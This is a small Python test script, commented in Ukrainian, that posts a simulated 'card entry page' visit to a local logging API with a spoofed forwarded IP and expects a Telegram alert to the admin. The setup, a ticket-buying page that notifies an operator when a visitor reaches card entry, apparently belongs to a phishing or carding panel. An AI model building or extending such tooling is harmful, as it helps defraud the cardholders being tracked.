#!/usr/bin/env python3
"""
Тест логування сторінки введення карти
"""

import requests
import json

def test_card_page_logging():
    """Тестує логування сторінки введення карти"""
    
    # URL для тестування
    base_url = "http://127.0.0.1:8081"
    
    # Тестові дані
    test_data = {
        "page_code": "1-4",  # Існуючий page_code з бази даних
        "page_url": "/buy-tickets/loading/",
        "action_type": "page_view",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "referer": "https://metanoia-gallery.com/"
    }
    
    print("🧪 Тестування логування сторінки введення карти...")
    print(f"📝 Дані: {json.dumps(test_data, indent=2, ensure_ascii=False)}")
    
    try:
        # Відправляємо запит на логування
        response = requests.post(
            f"{base_url}/api/log_activity",
            json=test_data,
            headers={
                "Content-Type": "application/json",
                "X-Forwarded-For": "37.52.215.105"  # Тестовий IP з України
            },
            timeout=10
        )
        
        if response.status_code == 200:
            print("✅ Логування успішне!")
            result = response.json()
            print(f"📊 Результат: {result}")
        else:
            print(f"❌ Помилка логування: {response.status_code}")
            print(f"📄 Відповідь: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print("❌ Не вдалося підключитися до сервера. Переконайтеся, що сервер запущений на порту 8081")
    except Exception as e:
        print(f"❌ Помилка: {e}")
    
    print("\n📱 Перевірте Telegram повідомлення адміну:")
    print("• Повідомлення має показувати 'Ввод карты' як назву сторінки")
    print("• IP має бути 37.52.215.105")
    print("• Країна має бути UA (Україна)")

if __name__ == "__main__":
    test_card_page_logging()
